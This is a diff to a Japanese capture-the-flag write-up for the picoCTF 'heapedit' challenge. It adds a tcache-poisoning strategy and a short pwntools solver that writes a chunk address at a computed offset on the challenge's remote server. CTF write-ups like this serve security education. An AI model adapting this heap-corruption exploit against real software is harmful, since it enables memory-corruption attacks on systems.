@@ -93,6 +93,27 @@ undefined8 main(void)
 - `local_aO` = 0x6034a0
 - 1つ目のtcache bin `0x603890` = 0x602088
 - 2つ目のfreed chunk = `0x603800`
+## 方針
+`malloc`で確保されるチャンクを2回目に`free`されたチャンクにしたい
+`tcache bins`の中に書いてあるアドレスを書き換えて、1回目に`free`されたチャンクの参照先を2回目に`free`されたチャンクのアドレスに書き換える
 
+書き換えるアドレスは`local_a0`からの相対距離で指定することに注意してソルバーを作成する
+
+## solver
+```python
+from pwn import *
+
+# io = process("./heapedit_patched")
+io = remote("mercury.picoctf.net", 31153)
+io.recvuntil(b"Address")
+address = str(0x6034A0 - 0x602088)
+io.sendline(b"-" + address.encode())
+
+io.recvuntil("Value")
+io.sendline(p64(0x603800))
+io.interactive()
+```
+
+flagを表示することができた
 ## 参考文献
 https://sh0ebill.hatenablog.com/entry/2022/09/28/215346
